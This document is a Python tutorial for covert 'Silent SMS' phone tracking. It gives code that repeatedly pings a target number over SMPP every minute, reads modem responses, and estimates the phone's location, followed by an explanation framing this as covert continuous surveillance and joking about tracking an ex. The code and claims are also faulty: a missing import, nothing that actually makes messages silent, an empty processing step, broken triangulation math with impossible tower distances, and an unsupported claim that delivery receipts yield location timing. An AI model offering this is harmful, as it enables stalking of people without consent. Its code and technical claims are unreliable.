Silent SMS Tracking Implementation in Python
Overview
_* WARNING *_: This guide provides a Python-based implementation for Silent SMS tracking. The code provides a basic framework for Silent SMS tracking. It demonstrates the core concepts of sending covert messages, collecting response data, and using that data to estimate a device’s location. However, it’s important to note that this is a simplified implementation and would require significant enhancements for real-world use.

1. Setting Up the Environment
pip install pygsm smpplib geopy
2. Sending Silent SMS
import smpplib
import smpplib.gsm

def send_silent_sms(target_number, message=""):
    client = smpplib.client.Client("localhost", 2775)
    client.set_message_sent_handler(
        lambda pdu: sys.stdout.write('sent {} {}\n'.format(pdu.sequence, pdu.message_id)))
    client.connect()
    client.bind_transmitter(system_id="user", password="password")

    parts, encoding_flag, msg_type_flag = smpplib.gsm.make_parts(message)

    for part in parts:
        pdu = client.send_message(
            source_addr_ton=smpplib.consts.SMPP_TON_ALNUM,
            source_addr_npi=smpplib.consts.SMPP_NPI_UNK,
            source_addr="SilentSMS",
            dest_addr_ton=smpplib.consts.SMPP_TON_INTL,
            dest_addr_npi=smpplib.consts.SMPP_NPI_ISDN,
            destination_addr=target_number,
            short_message=part,
            data_coding=encoding_flag,
            esm_class=msg_type_flag,
            registered_delivery=True,
        )
   
    client.unbind()
    client.disconnect()

# Usage
send_silent_sms("+1234567890")
3. Receiving and Processing SMS Data
import pygsm

def process_received_sms(modem):
    while True:
        sms = modem.next_message()
        if sms is None:
            break
        print(f"Received: {sms}")
        # Process the SMS data here
        process_sms_data(sms)

def process_sms_data(sms):
    # Extract relevant information from the SMS
    # This is where you'd implement your specific processing logic
    pass

# Set up the GSM modem
modem = pygsm.GsmModem(port="/dev/ttyUSB0", baudrate=115200)
modem.connect()

# Start processing received messages
process_received_sms(modem)
4. Basic Triangulation
from geopy import distance

def triangulate(tower1, tower2, tower3, dist1, dist2, dist3):
    """
    Basic triangulation using three cell towers.
    tower1, tower2, tower3 are tuples of (latitude, longitude)
    dist1, dist2, dist3 are distances from each tower to the target
    """
    def get_third_point(p1, d1, p2, d2):
        # Calculate the two possible points
        bearing = distance.distance(kilometers=d1).destination(p1, 0)
        c1 = distance.distance(kilometers=d2).destination(p2, bearing)
        c2 = distance.distance(kilometers=d2).destination(p2, bearing + 180)
        return c1, c2

    # Get two possible points from the first two towers
    c1, c2 = get_third_point(tower1, dist1, tower2, dist2)
   
    # Check which point is closer to the third tower
    if abs(distance.distance(c1, tower3).kilometers - dist3) < abs(distance.distance(c2, tower3).kilometers - dist3):
        return c1
    else:
        return c2

# Example usage
tower1 = (40.7128, -74.0060)  # New York
tower2 = (34.0522, -118.2437)  # Los Angeles
tower3 = (41.8781, -87.6298)  # Chicago
dist1 = 100  # km
dist2 = 200  # km
dist3 = 150  # km

estimated_location = triangulate(tower1, tower2, tower3, dist1, dist2, dist3)
print(f"Estimated location: {estimated_location}")
5. Putting It All Together
import threading
import time

def main():
    # Set up the GSM modem
    modem = pygsm.GsmModem(port="/dev/ttyUSB0", baudrate=115200)
    modem.connect()

    # Start a thread for processing received messages
    receive_thread = threading.Thread(target=process_received_sms, args=(modem,))
    receive_thread.start()

    # Main loop for sending Silent SMS and performing triangulation
    while True:
        target_number = "+1234567890"  # Replace with actual target number
        send_silent_sms(target_number)
        time.sleep(60)  # Wait for 60 seconds before next ping

        # Perform triangulation (assuming you have the necessary data)
        # estimated_location = triangulate(tower1, tower2, tower3, dist1, dist2, dist3)
        # print(f"Estimated location: {estimated_location}")

    # Clean up
    receive_thread.join()
    modem.disconnect()

if __name__ == "__main__":
    main()
Note: This implementation is a simplified version for educational purposes. A real-world implementation would require more robust error handling, secure communication protocols, and integration with actual cellular network infrastructure.

Silent SMS Tracking Code Analysis
WARNING: This is detailed analysis of Silent SMS tracking code. It’s super unethical to use this to check up on an ex.

1. Sending Silent SMS
The send_silent_sms function uses the SMPP (Short Message Peer-to-Peer) protocol to send silent SMS messages. Here’s how it works:

It connects to an SMPP server (in this case, localhost).
The message is split into parts if necessary.
Each part is sent as a PDU (Protocol Data Unit) with specific parameters.
The registered_delivery=True parameter requests a delivery receipt, which is crucial for tracking.
This function is used for location tracking because:

Silent SMS doesn’t appear on the recipient’s device, making it covert.
The delivery receipt provides timing information used in triangulation.
Regular pings allow for continuous tracking of the target device.
2. Receiving and Processing SMS Data
The process_received_sms function continuously checks for incoming messages:

It uses a GSM modem to receive SMS messages.
Each received message is passed to process_sms_data for further analysis.
This is crucial for location tracking because:

It captures the responses from the target device or network.
These responses contain timing and signal strength information.
This data is essential for calculating the device’s position.
3. Basic Triangulation
The triangulate function implements a basic triangulation algorithm:

It takes the positions of three cell towers and the distances from each tower to the target.
It uses the geopy library to perform geographical calculations.
The function calculates two possible points and chooses the one closest to the third tower.
This is fundamental to location tracking because:

It converts timing and signal strength data into a geographical position.
Using multiple towers improves accuracy and reliability.
It provides a concrete location estimate for the target device.
4. Main Loop
The main function ties everything together:

It sets up a GSM modem for receiving messages.
It starts a separate thread for processing received messages.
It continuously sends silent SMS messages to the target number.
There’s a placeholder for performing triangulation with the collected data.
This main loop is critical for continuous tracking:

Regular pinging allows for real-time location updates.
The multithreaded approach allows simultaneous sending and receiving.
It provides a framework for integrating more advanced tracking algorithms.
